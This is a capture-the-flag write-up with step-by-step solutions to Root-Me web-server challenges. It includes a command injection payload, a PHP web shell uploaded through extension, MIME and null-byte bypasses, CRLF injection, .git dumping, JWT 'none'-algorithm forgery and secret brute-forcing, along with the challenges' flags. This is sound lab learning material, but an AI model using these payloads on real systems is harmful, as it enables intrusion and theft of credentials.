## Web Server root-me

### HTML - Source code

F12:

```
Je crois que c'est vraiment trop simple là !
It's really too easy !
password : nZ^&@q5&sjJHev0
```

### HTTP - IP restriction bypass

Add Header `X-Forwarded-For: 127.0.0.1`, `X-Forwarded-For: 192.168.1.1`, ...

```
Well done, the validation password is: Ip_$po0Fing
```

### HTTP - Open redirect

Open Facebook: http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134

Open Twitter: http://challenge01.root-me.org/web-serveur/ch52/?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0

Decode md5: a023cfbf5f1c39bdf8407f28b60cd134 -> https://facebook.com, be8b09f7f1f66235a9c91986952483f0 -> https://twitter.com

-> Redirect to: http://challenge01.root-me.org/web-serveur/ch52/?url=https://www.youtube.com&h=d245406cb6c9f36be9064c92c34e12e1

```
Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5
```

### HTTP - User-agent

Change Header `User-Agent: admin`

```
Welcome master!<br/>Password: rr$Li9%L34qd1AAe27
```

### Weak password

Payload username=admin&password=admin  -> password is `admin`

### PHP - Command injection

Payload `127.0.0.1;cat .passwd` -> S3rv1ceP1n9Sup3rS3cure

### Backup file

`curl http://challenge01.root-me.org/web-serveur/ch11/index.php~`

```
$username="ch11";
$password="OCCY9AcNm1tj";
...
```

### HTTP - Directory indexing

F12 -> we can see: `<!-- include("admin/pass.html") -->` in source code.

Access admin/pass.html -> back to admin -> access backup/admin.txt -> Password / Mot de passe : LINUX

### HTTP - Headers

We can see in Response Header `Header-RootMe-Admin: none` -> Change to `Header-RootMe-Admin: true`.

```
You dit it ! You can validate the challenge with the password HeadersMayBeUseful
```

### HTTP - POST

POST -> Change score in Request Body to 1000000 -> Re-POST

```
Flag to validate the challenge: H7tp_h4s_N0_s3Cr37S_F0r_y0U 
```

### HTTP - Improper redirect

The application redirect from index.php to login.php if you don't login.

Let's try: `curl challenge01.root-me.org/web-serveur/ch32/index.php`

```
The flag is : ExecutionAfterRedirectIsBad
```

### HTTP - Verb tampering

Try change method:

`curl -X POST challenge01.root-me.org/web-serveur/ch8/`

`curl -X PUT challenge01.root-me.org/web-serveur/ch8/`

```
<h1>Mot de passe / password : a23e$dme96d3saez$$prap
```

### Install files

F12 -> we can see `<!--  /web-serveur/ch6/phpbb -->` in source code.

Try access `http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php`:

```
Le mot de passe pour valider est : karambar
```

### CRLF

We can use the payload: `?username=admin authenticated.%0D%0Afoo&password=authenticated`

And get the response:

```
admin authenticated.
foo failed to authenticate.

Well done, you can validate challenge with this password : rFSP&G0p&5uAg1% 
```

### File upload - Double extensions

Create file `a.php.png` with following content and upload:

```php
<?php
$data = system($_GET["cmd"]);
echo $data;
?> 
```

Access to the file uploaded and add params on url `?cmd=ls`

```
a.php.png test.php.jpg test.php.png test.php.png 
```

Now we can use path traversal, let's try: `?cmd=ls ../../../ -a`

```
. .. ._init ._nginx.http-level.inc ._nginx.server-level.inc ._perms ._php-fpm.pool.inc .git .gitignore .passwd galerie index.php tmp tmp 
```

Finally, get password: `?cmd=cat ../../../.passwd`

```
Gg9LRz-hWSxqqUKd77-_q-6G8
```

### File upload - MIME type

Create `test.php` file with the following content:

```php
<?php
$data = system($_GET["cmd"]);
echo $data;
?> 
```

Upload file with intercept, change header `Content-Type: image/png` -> Upload successfully!

Access file `galerie/upload/274661e11adfa6605d5aaa8b7f8a6485//test.php`, add parameter `?cmd=ls%20../../../%20-a`:

```
. .. ._init ._nginx.http-level.inc ._nginx.server-level.inc ._perms ._php-fpm.pool.inc .git .gitignore .passwd galerie index.php tmp tmp
```

Change parameter to `?cmd=cat%20../../../.passwd`:

```
a7n4nizpgQgnPERy89uanf6T4
```

### HTTP - Cookies

Change `Cookie: ch7=admin, ...` -> Validation password : ml-SYMPA

### Insecure Code Management

Download `.git` folder using: `wget --no-parent -r http://challenge01.root-me.org/web-serveur/ch61/.git/`

Access .git folder and tracking: `git log`

```
commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
Author: John <john@bs-corp.com>
Date:   Fri Sep 27 20:10:05 2019 +0200

    blue team want sha256!!!!!!!!!

commit 550880c40814a9d0c39ad3485f7620b1dbce0de8
Author: John <john@bs-corp.com>
Date:   Mon Sep 23 15:10:07 2019 +0200

    renamed app name

commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
Author: John <john@bs-corp.com>
Date:   Sun Sep 22 12:38:32 2019 +0200

    changed password

commit 1572c85d624a10be0aa7b995289359cc4c0d53da
Author: John <john@bs-corp.com>
Date:   Thu Sep 12 11:10:06 2019 +0200

    secure auth with md5
```

Checkout commit: `git checkout a8673b295eca6a4fa820706d5f809f1a8b49fcba`

Now we can use `ls` to show all file:

```
$ ls
config.php  index.php
```

Read config file: `cat config.php`:

```
<?php
    $username = "admin";
    $password = "s3cureP@ssw0rd";
```

### JSON Web Token (JWT) - Introduction

Login as Guest!, we can get the cookie in response:

`jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`

We can decode it:

`echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d` -> {"typ":"JWT","alg":"HS256"}

`echo -n eyJ1c2VybmFtZSI6Imd1ZXN0In0 | base64 -d` -> {"username":"guest"}

`OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk` is secret base HS256, we don't know it.

But we can generate jwt for admin by change the algorithm signing to "none", look like that:

`echo -n '{"typ":"JWT","alg":"none"}' | base64` -> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=

`echo -n '{"username":"admin"}' | base64` -> eyJ1c2VybmFtZSI6ImFkbWluIn0=

And keeping the secret: OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk

This is the jwt for admin: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`

POST cookie in the request:

`curl http://challenge01.root-me.org/web-serveur/ch58/index.php --cookie jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk `

```
Welcome admin to this website! :)<br><br>You can validate the challenge with the flag : S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
```

### Directory traversal

This application include local file, first we try set page include root folder (`?galerie=/`):

We can see `86hwnX2r` folder in /. Next: `?galerie=86hwnX2r`

Oh, we can see the `password.txt` in folder `86hwnX2r`. OK, open file: `http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt` -> kcb$!Bx@v4Gs9Ez

### File upload - Null byte

Create file `test.php%00.png` with the following content:

```php
<?php
$data = system($_GET["cmd"]);
echo $data;
?>
```

After upload file, we can access file to get password: http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/4acfbde85e2f34215c875b0eb2ebe90d/test.php

```
Well done ! You can validate this challenge with the password : YPNchi2NmTwygr2dgCCF
This file is already deleted.
```

### JSON Web Token (JWT) - Weak secret

Access to /token, we get the token:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw`

Try decode it:

`echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9 | base64 -d` -> {"typ":"JWT","alg":"HS512"}

`echo -n eyJyb2xlIjoiZ3Vlc3QifQ | base64 -d` -> {"role":"guest"}

We need brute-force to find secret: 4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw

In this challenge, I will use `https://github.com/brendan-rius/c-jwt-cracker` to brute-force secret:

`./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw qwertyuiopasdfghjklzxvbnm1234567890 6 sha512`

where `qwertyuiopasdfghjklzxvbnm1234567890` is valid character, `6` is maximum length of secret.

```
Secret is "lol"
```

Now we can generate jwt for admin with payload data is `{"role":"admin"}`: This is `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA`

POST to /admin, we get:

```
"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
```

Change Header `Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA` and Re-POST:

```
"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime\n"
```

### JWT - Revoked token

This is source code:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
import datetime
from apscheduler.schedulers.background import BackgroundScheduler
import threading
import jwt
from config import *
 
# Setup flask
app = Flask(__name__)
 
app.config['JWT_SECRET_KEY'] = SECRET
jwtmanager = JWTManager(app)
blacklist = set()
lock = threading.Lock()
 
# Free memory from expired tokens, as they are no longer useful
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
 
@app.route("/web-serveur/ch63/")
def index():
    return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
 
# Standard login endpoint
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
 
# Standard admin endpoint
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
 
 
if __name__ == '__main__':
    scheduler = BackgroundScheduler()
    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
    scheduler.start()
    app.run(debug=False, host='0.0.0.0', port=5000)
```

First, POST request to /login with parameter: `{"username": "admin", "password": "admin"}` with `Content-Type: application/json`, we get the jwt token:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`

Go to /admin, add header `Authentication: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`

```
{"msg":"Bad Authorization header. Expected value 'Bearer <JWT>'"}
```

Change header `Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`

```
{"msg":"Token is revoked"}
```

Because the token was saved in blacklist, but based base64 decode we have the `=` is padding. Let's change the header (by adding `=` in the last of token):

`Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0=`

```
{"Congratzzzz!!!_flag:":"Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"}
```

